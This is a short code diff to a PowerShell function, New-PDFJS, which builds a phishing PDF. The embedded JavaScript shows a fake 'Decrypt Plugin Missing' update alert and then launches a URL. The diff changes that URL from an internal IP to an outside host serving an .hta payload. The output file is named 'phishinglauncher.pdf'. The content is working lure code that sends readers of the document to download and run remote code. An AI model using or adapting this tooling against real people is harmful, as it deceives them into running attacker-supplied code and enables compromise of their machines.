@@ -39,7 +39,7 @@ function New-PDFJS {
 
         [CmdletBinding()]
     Param (
-        [string]$js = "app.alert('Decrypt Plugin Missing, requires Update '+app.viewerVersion);app.launchURL('http://10.10.75.99/r.html');",
+        [string]$js = "app.alert('Decrypt Plugin Missing, requires Update '+app.viewerVersion);app.launchURL('http://bluenotch.com/idontreadsrc.hta');",
         [string]$msg = "FAKE Application Error - Required Encryption Plugin Missing",
         [string]$filename = "C:\PDF\phishinglauncher.pdf"
         )
@@ -78,4 +78,3 @@ function New-PDFJS {
 
     $doc.Save($filename)
 }
-
